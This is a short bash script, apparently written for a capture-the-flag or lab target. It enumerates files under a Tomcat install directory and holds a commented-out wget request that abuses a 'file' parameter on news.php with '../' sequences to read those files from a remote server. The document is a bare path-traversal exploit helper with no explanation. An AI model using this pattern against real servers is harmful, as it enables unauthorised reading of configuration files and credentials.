#!/bin/bash

FILES=/opt/tomcat/latest/**
shopt -s globstar
for file in /opt/tomcat/latest/**
do
    echo $file
    #wget http://10.10.10.194/news.php?file=../../../../..$file
done





